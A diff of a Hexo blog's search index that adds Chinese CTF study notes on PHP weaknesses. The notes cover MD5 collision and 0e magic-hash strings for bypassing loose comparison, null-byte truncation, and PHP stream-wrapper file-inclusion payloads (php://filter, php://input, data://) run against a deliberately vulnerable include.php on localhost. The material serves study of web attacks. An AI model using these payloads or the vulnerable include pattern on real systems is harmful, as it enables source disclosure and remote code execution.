@@ -1,30 +1,375 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/01/05/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+    <title>特殊的md5值</title>
+    <url>/2022/01/06/%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="三个相同MD5值的字符串-字符串不同，细微区别"><a href="#三个相同MD5值的字符串-字符串不同，细微区别" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<h3 id="三个相同MD5值的字符串-字符串不同，细微区别-1"><a href="#三个相同MD5值的字符串-字符串不同，细微区别-1" class="headerlink" title="三个相同MD5值的字符串(字符串不同，细微区别):"></a>三个相同<code>MD5</code>值的字符串(字符串不同，细微区别):</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="一个5位数和一个6位数的0e开头md5全数字的值"><a href="#一个5位数和一个6位数的0e开头md5全数字的值" class="headerlink" title="一个5位数和一个6位数的0e开头md5全数字的值"></a>一个5位数和一个6位数的0e开头md5全数字的值</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line"><span class="number">0e591948146966052067035298880982</span></span><br><span class="line">sonZ7y</span><br><span class="line"><span class="number">0e463306343746311593316642162425</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="只包含一种字符的0e开头的md5值："><a href="#只包含一种字符的0e开头的md5值：" class="headerlink" title="只包含一种字符的0e开头的md5值："></a>只包含一种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>FVWc</span><br><span class="line"><span class="number">0</span>ef715f5943144181839f9f321584156</span><br><span class="line"><span class="number">2</span>uM8z</span><br><span class="line"><span class="number">0e0081018231</span>f666742748f3540f4761</span><br><span class="line"><span class="number">3</span>za1b</span><br><span class="line"><span class="number">0e02</span>f196724391824188f3f90f732735</span><br></pre></td></tr></table></figure>
+
+<h3 id="只包含两种字符的0e开头的md5值："><a href="#只包含两种字符的0e开头的md5值：" class="headerlink" title="只包含两种字符的0e开头的md5值："></a>只包含两种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span>c84</span><br><span class="line"><span class="number">0e17</span>d931d17f1948d37d691693995ff1</span><br><span class="line"><span class="number">01</span>bDI</span><br><span class="line"><span class="number">0</span>ee26113820055502806791698800f47</span><br><span class="line"><span class="number">01</span>NxP</span><br><span class="line"><span class="number">0e72096</span>d884f956d9618012679405269</span><br><span class="line"><span class="number">02</span>K7w</span><br><span class="line"><span class="number">0e543091322</span>e0f42ef1126374409f755</span><br><span class="line"><span class="number">04072</span></span><br><span class="line"><span class="number">0e8</span>f06d06387944ff396030861fd2698</span><br><span class="line"><span class="number">044</span>Dt</span><br><span class="line"><span class="number">0e91946379408</span>e6f2f62152293e4f596</span><br><span class="line"><span class="number">05</span>nnu</span><br><span class="line"><span class="number">0</span>ef580f7a2f4176f57544f8091f33936</span><br><span class="line"><span class="number">05</span>wPJ</span><br><span class="line"><span class="number">0e49528768</span>d18f101816843669079475</span><br></pre></td></tr></table></figure>
+
+<h3 id="下列的字符串的MD5值都是0e开头的："><a href="#下列的字符串的MD5值都是0e开头的：" class="headerlink" title="下列的字符串的MD5值都是0e开头的："></a>下列的字符串的<code>MD5</code>值都是<code>0e</code>开头的：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>为什么是以<code>0e</code>开头的<code>md5</code>值？(前提<code>==</code>号，而不是<code>===</code>)科学计数法中<code>0e123</code>和<code>0e456</code>是相同的，因为0乘以任何数都是<code>0</code>。</p>
+<ul>
+<li>== 两边值类型不同的时候，要先进行类型转换，再比较。</li>
+<li>=== 不做类型转换，类型不同的一定不等。</li>
+</ul>
+<p>转载自:<a href="https://blog.csdn.net/qq_42967398/article/details/104522626">https://blog.csdn.net/qq_42967398/article/details/104522626</a></p>
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/01/05/%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>MIME</p>
+    <title>00截断</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/00%E6%88%AA%E6%96%AD/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h2 id="0x00截断和-00截断"><a href="#0x00截断和-00截断" class="headerlink" title="0x00截断和%00截断"></a>0x00截断和%00截断</h2><h3 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。</p>
+<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><p> PHP&lt;5.3.29 ，且GPC关闭</p>
+<h2 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h2><p>%00截断与0x00截断是一样的   </p>
+<p>只不过是用于 url 中的截断</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>PHP伪协议</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
+    <content><![CDATA[<h3 id="作用"><a href="#作用" class="headerlink" title="作用:"></a>作用:</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的，且不受allow_url_fopen与allow_url_include的影响。</p>
+<p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
 <span id="more"></span>
 
-<h2 id="MIME是什么"><a href="#MIME是什么" class="headerlink" title="MIME是什么?"></a><code>MIME</code>是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
+<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件:"></a>条件:</h3><ol>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include:off/on</li>
+</ol>
+<h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用:"></a>作用:</h3><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的，且不受allow_url_fopen与allow_url_include的影响。</p>
+<p>include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
+<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h2><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件:"></a>条件:</h3><ol>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_include:仅php://input php://stdin php://memory php://temp 需要on</li>
+</ol>
+<h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用:"></a>作用:</h3><p>php://访问各个输入/输出流(I/O streams)，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
+<p>php://filter参数详解</p>
+<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
+<table>
+<thead>
+<tr>
+<th>php://filter 参数</th>
+<th>描述</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+<td></td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
+<td>*）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
+<td>）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h3><p>1.<code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<p>include.php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>phpinfo.php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后得到结果</p>
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010115926270.png" class="" title="image-20211010115926270">
+
+<p>2.php://input + [POST DATA]执行php代码</p>
+<p><code>enctype=&quot;multipart/form-data&quot;</code> 的时候 php://input 是无效的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=php://input</span></span><br><span class="line">[POST DATA部分]</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="PHP伪协议/image-20211010142310571.png" alt="image-20211010142310571" style="zoom: 80%;" />
+
+<p>(我用的是CFT中的一道题，本地好像有点问题)得到</p>
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010142416110.png" class="" title="image-20211010142416110">
+
+<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h2><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件:"></a>条件:</h3><ol>
+<li>allow_url_fopen:on</li>
+<li>allow_url_fopen:on</li>
+</ol>
+<h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用:"></a>作用:</h3><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码</p>
+<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例:"></a>示例:</h3><p>1.data://text/plain</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010141723077.png" class="" title="image-20211010141723077">
+
+<p>(我用的是CFT中的一道题，本地好像有点问题)得到</p>
+<p>2.data://text//plain;base64,代码的base64编码</p>
+<img src="PHP伪协议/image-20211010143003591.png" alt="image-20211010143003591" style="zoom: 50%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>
+
+<p>执行得到结果</p>
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/image-20211010142809558.png" class="" title="image-20211010142809558">
+
+<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp;https://协议"></a>http:// &amp;https://协议</h2><h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件:"></a>条件:</h3><ol>
+<li>allow_url_fopen:on</li>
+<li>allow_url_include:on</li>
+</ol>
+<h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用:"></a>作用:</h3><p>常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或者资源。CTF中通常用于远程包含</p>
+<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例:"></a>示例:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://segmentfault.com/img/bVbrQBP/view" alt="preview"></p>
+<img src="/2022/01/06/%E6%9D%82%E9%A1%B9/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/123.jpg" class="" title="img">
+
+<p>(不是我的电脑跑出来的)</p>
+<h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://协议"></a>zip:// &amp; bzip2:// &amp; zlib://协议</h2><h3 id="条件-4"><a href="#条件-4" class="headerlink" title="条件:"></a>条件:</h3><ol>
+<li>allow_url_fopen:off/on</li>
+<li>allow_url_fopen:off/on</li>
+</ol>
+<h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用:"></a>作用:</h3><p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀:jpg png gif xxx等等。</p>
+<h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例:"></a>示例:</h3><p>1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</p>
+<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
